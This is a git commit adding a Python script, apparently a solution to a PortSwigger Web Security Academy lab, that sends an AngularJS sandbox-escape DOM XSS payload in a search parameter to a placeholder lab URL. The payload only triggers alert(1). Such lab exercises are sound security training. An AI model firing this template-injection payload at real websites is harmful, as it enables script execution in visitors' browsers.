afc17cbd71a8009b4162496da2e712226beb2a47
madi <120677197+lemaitre69764@users.noreply.github.com>
2024-12-01 22:04:29 +0500

    Create domxss_angularjs.py

---
+++ Client-side topics/DOM-Based XSS/domxss_angularjs.py
@@ -0,0 +1,25 @@
+import requests
+
+
+def send_exploit(url, payload):
+  
+    URL = f"{url}?search={payload}"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+    }
+    try:
+        response = requests.get(URL, headers=headers)
+        
+        if response.status_code == 200:
+            print("[+] Эксплойт отправлен успешно!")
+            print(f"URL с полезной нагрузкой: {URL}")
+        else:
+            print(f"[-] Ошибка: сервер вернул статус-код {response.status_code}")
+    
+    except requests.RequestException as e:
+        print(f"[-] Ошибка при выполнении запроса: {e}")
+
+if __name__ == "__main__":
+    target_url = "https://LAB-ID.web-security-academy.net/" #put the lab-id here
+    xss_payload = "{{ $on.constructor('alert(1)')() }}"
+    send_exploit(target_url, xss_payload)
